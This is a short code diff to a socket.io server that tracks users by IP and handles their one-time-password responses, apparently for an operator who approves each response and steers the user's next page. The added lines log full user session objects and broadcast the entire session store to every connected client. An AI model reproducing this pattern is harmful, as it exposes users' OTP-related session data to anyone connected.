@@ -370,6 +370,8 @@ io.on('connection', (socket, req) => {
     socket.on('sendOTPResponse', (data) => {
         if (sessionStore.has(userIP)) {
             let userDetails = sessionStore.get(userIP);
+            console.log(userDetails);
+            console.log(userDetails.getUserDataNavig);
             if(data.res == 'good'){
                 console.log(data.ip)
                 console.log(userDetails.getUserDataNavig.next)
@@ -395,6 +397,7 @@ io.on('connection', (socket, req) => {
 
             userDetails.getUserDataNavig = data
             sessionStore.set(userIP, userDetails);
+            io.emit('join', Array.from(sessionStore.entries()));
         }
     })
 
@@ -411,6 +414,7 @@ io.on('connection', (socket, req) => {
 
             userDetails.getUserDataType = data
             sessionStore.set(userIP, userDetails);
+            io.emit('join', Array.from(sessionStore.entries()));
         }
     })
     
